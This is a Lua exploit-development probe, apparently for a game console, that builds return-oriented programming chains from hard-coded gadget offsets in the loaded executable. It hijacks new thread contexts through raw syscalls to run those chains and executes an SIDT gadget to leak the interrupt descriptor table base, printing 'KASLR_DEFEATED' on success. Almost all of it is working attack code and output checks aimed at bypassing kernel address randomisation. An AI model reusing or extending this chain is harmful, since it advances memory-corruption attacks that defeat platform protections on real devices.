-- CRASH_CLASS: MODERATE
-- PROBE 144a: SIDT diagnostic — test if thread ROP works, then test SIDT
--
-- Test A: Thread writes marker without SIDT (validates infrastructure)
-- Test B: Thread executes SIDT gadget (if A passes)

print("=== PROBE 144a: SIDT DIAG ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc_gc = make_syscall(421)
local sc_mmap = make_syscall(477)
local sc_thr = make_syscall(430)

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))
print("eboot=0x" .. string.format("%X%08X", ehi, elo))

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
print("gpu=0x" .. string.format("%X%08X", gh, gl))

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rcx = uint64(string.format("0x%X%08X", ehi, elo + 0xE64))
local g_wr      = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

--------------------------------------------------------------------
-- [A] TEST: Thread ROP without SIDT
-- Just: nanosleep → write marker → long sleep
--------------------------------------------------------------------
print("TEST_A: ROP_ONLY")

local doneA = gpu + 0x10000
wq(doneA, uint64(0))
local doneA_addr = uint64(string.format("0x%X%08X", gh, gl + 0x10000))

local ts_short = gpu + 0x11000
wq(ts_short, uint64(0))
wq(ts_short + 8, uint64(50000000))
local ts_short_a = uint64(string.format("0x%X%08X", gh, gl + 0x11000))

local ts_long = gpu + 0x11100
wq(ts_long, uint64(30))
wq(ts_long + 8, uint64(0))
local ts_long_a = uint64(string.format("0x%X%08X", gh, gl + 0x11100))

local ropA = gpu + 0x20000
local ropA_a = uint64(string.format("0x%X%08X", gh, gl + 0x20000))
local i = 0

-- nanosleep 50ms
wq(ropA+i, g_pop_rdi); i=i+8
wq(ropA+i, ts_short_a); i=i+8
wq(ropA+i, g_pop_rsi); i=i+8
wq(ropA+i, uint64(0)); i=i+8
wq(ropA+i, g_pop_rax); i=i+8
wq(ropA+i, uint64(240)); i=i+8
wq(ropA+i, sc_addr); i=i+8

-- write marker: pop_rax=0xAAAA1111; pop_rdi=doneA_addr; mov [rdi],rax; ret
wq(ropA+i, g_pop_rax); i=i+8
wq(ropA+i, uint64("0x00000000AAAA1111")); i=i+8
wq(ropA+i, g_pop_rdi); i=i+8
wq(ropA+i, doneA_addr); i=i+8
wq(ropA+i, g_wr); i=i+8

-- park: long nanosleep
wq(ropA+i, g_pop_rdi); i=i+8
wq(ropA+i, ts_long_a); i=i+8
wq(ropA+i, g_pop_rsi); i=i+8
wq(ropA+i, uint64(0)); i=i+8
wq(ropA+i, g_pop_rax); i=i+8
wq(ropA+i, uint64(240)); i=i+8
wq(ropA+i, sc_addr); i=i+8

-- Thread context
local tctxA = gpu + 0x30000
for off = 0, 0x4FF, 4 do wd(tctxA + off, 0) end
pcall(function() return sc_gc(uint64(tctxA)) end)
wq(tctxA + 0xE0, g_ret)
wq(tctxA + 0xF8, ropA_a)

local tbufA = gpu + 0x40000
wq(tbufA, uint64(0))

local ok_a, rv_a = pcall(function()
    return sc_thr(uint64(tctxA), uint64(tbufA), uint64(0))
end)
print("THR_A=" .. tostring(rv_a))

-- Wait 300ms
local tw = memory.alloc(16)
wq(tw, uint64(0))
wq(tw + 8, uint64(300000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

local dvA = memory.read_qword(doneA)
local dvAh, dvAl = get_hi_lo(dvA)
print("DONE_A=0x" .. string.format("%08X", dvAl))

if dvAl ~= 0xAAAA1111 then
    print("TEST_A_FAILED: thread ROP not working")
    print("=== DONE ===")
    return
end
print("TEST_A_PASS: thread ROP works")

--------------------------------------------------------------------
-- [B] TEST: Thread executes SIDT gadget
-- sidt [rax-0x73]; add [r8+0x29],ecx; ret
--------------------------------------------------------------------
print("TEST_B: SIDT")

local rbuf = gpu + 0x12000
for off = 0, 15, 4 do wd(rbuf + off, 0xDDDDDDDD) end
local rbuf_addr = uint64(string.format("0x%X%08X", gh, gl + 0x12000))
local rax_val = uint64(string.format("0x%X%08X", gh, gl + 0x12073))

local scratch = gpu + 0x12200
wd(scratch, 0)
local r8_val = uint64(string.format("0x%X%08X", gh, gl + 0x121D7))

local doneB = gpu + 0x12100
wq(doneB, uint64(0))
local doneB_addr = uint64(string.format("0x%X%08X", gh, gl + 0x12100))

local sidt_gadget = uint64(string.format("0x%X%08X", ehi, elo + 0x1C29F9))

local ropB = gpu + 0x24000
local ropB_a = uint64(string.format("0x%X%08X", gh, gl + 0x24000))
i = 0

-- nanosleep 50ms
wq(ropB+i, g_pop_rdi); i=i+8
wq(ropB+i, ts_short_a); i=i+8
wq(ropB+i, g_pop_rsi); i=i+8
wq(ropB+i, uint64(0)); i=i+8
wq(ropB+i, g_pop_rax); i=i+8
wq(ropB+i, uint64(240)); i=i+8
wq(ropB+i, sc_addr); i=i+8

-- set RAX = rbuf+0x73, RCX = 0, call SIDT
wq(ropB+i, g_pop_rax); i=i+8
wq(ropB+i, rax_val); i=i+8
wq(ropB+i, g_pop_rcx); i=i+8
wq(ropB+i, uint64(0)); i=i+8
wq(ropB+i, sidt_gadget); i=i+8

-- done marker
wq(ropB+i, g_pop_rax); i=i+8
wq(ropB+i, uint64("0x00000000BBBB2222")); i=i+8
wq(ropB+i, g_pop_rdi); i=i+8
wq(ropB+i, doneB_addr); i=i+8
wq(ropB+i, g_wr); i=i+8

-- park
wq(ropB+i, g_pop_rdi); i=i+8
wq(ropB+i, ts_long_a); i=i+8
wq(ropB+i, g_pop_rsi); i=i+8
wq(ropB+i, uint64(0)); i=i+8
wq(ropB+i, g_pop_rax); i=i+8
wq(ropB+i, uint64(240)); i=i+8
wq(ropB+i, sc_addr); i=i+8

-- Thread context with R8 set
local tctxB = gpu + 0x34000
for off = 0, 0x4FF, 4 do wd(tctxB + off, 0) end
pcall(function() return sc_gc(uint64(tctxB)) end)
wq(tctxB + 0xE0, g_ret)
wq(tctxB + 0xF8, ropB_a)
wq(tctxB + MC + 0x28, r8_val)
wq(tctxB + MC + 0x20, uint64(0))

local tbufB = gpu + 0x44000
wq(tbufB, uint64(0))

local ok_b, rv_b = pcall(function()
    return sc_thr(uint64(tctxB), uint64(tbufB), uint64(0))
end)
print("THR_B=" .. tostring(rv_b))

-- Wait 300ms
wq(tw, uint64(0))
wq(tw + 8, uint64(300000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

local dvB = memory.read_qword(doneB)
local dvBh, dvBl = get_hi_lo(dvB)
print("DONE_B=0x" .. string.format("%08X", dvBl))

if dvBl ~= 0xBBBB2222 then
    print("SIDT_CRASHED_THREAD")
    -- Check if rbuf was partially written
    local raw = ""
    for j = 0, 9 do
        local ok, bv = pcall(function() return to_num(memory.read_byte(rbuf + j)) end)
        if ok then raw = raw .. string.format("%02X ", bv) end
    end
    print("RBUF: " .. raw)
    print("=== DONE ===")
    return
end

print("SIDT_SURVIVED")

-- Read IDTR
local raw = ""
for j = 0, 15 do
    local ok, bv = pcall(function() return to_num(memory.read_byte(rbuf + j)) end)
    if ok then raw = raw .. string.format("%02X ", bv) end
end
print("RAW: " .. raw)

local lim_lo = to_num(memory.read_byte(rbuf))
local lim_hi = to_num(memory.read_byte(rbuf + 1))
local lim = lim_lo + lim_hi * 256
print("LIMIT=0x" .. string.format("%04X", lim))

local base0 = to_num(memory.read_dword(rbuf + 2))
local base1 = to_num(memory.read_dword(rbuf + 6))
print("BASE=0x" .. string.format("%08X%08X", base1, base0))

if base1 >= 0xFFFF8000 then
    print("***KASLR_DEFEATED***")
    print("IDT_BASE=0x" .. string.format("%08X%08X", base1, base0))
end

print("=== DONE ===")
